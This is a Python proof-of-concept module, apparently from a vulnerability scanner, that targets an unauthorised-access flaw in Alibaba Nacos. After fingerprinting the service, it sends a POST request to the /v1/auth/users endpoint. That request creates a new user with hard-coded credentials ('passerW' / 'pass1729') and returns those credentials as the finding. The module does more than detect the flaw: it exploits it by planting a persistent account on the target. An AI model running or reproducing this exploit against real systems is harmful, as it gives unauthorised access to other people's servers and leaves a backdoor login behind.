# -*- coding:utf-8 -*-
# Alibaba Nacos 未授权访问

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests

username = "passerW"
password = "pass1729"

class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False

    def create_user(self, url):
        resp = self.requestUtil.post(url+"/v1/auth/users", data=f"username={username}&password={password}")
        print(resp.text)
        if '"code":200' in resp.text or "already exist!" in resp.text:
            print(1)
            return True

    def fingerprint(self):
        try:
            if "Nacos" in self.service.title:
                resp = self.requestUtil.get(self.service.url+"/nacos")
                if resp.status_code == 200:
                    self.service.speciality = "/nacos"
                    self.service.save()
                return True
        except Exception as e:
            print(e)
            return False

    def poc(self):
        try:
            if not "nacos ok" in self.service.speciality:
                url = self.service.url + self.service.speciality
                if self.create_user(url):
                    self.service.speciality += ", nacos ok"
                else:
                    raise Exception
            return ["Alibaba Nacos 未授权访问", f"用户名: {username}<br>密码: {password}"]
        except:
            return []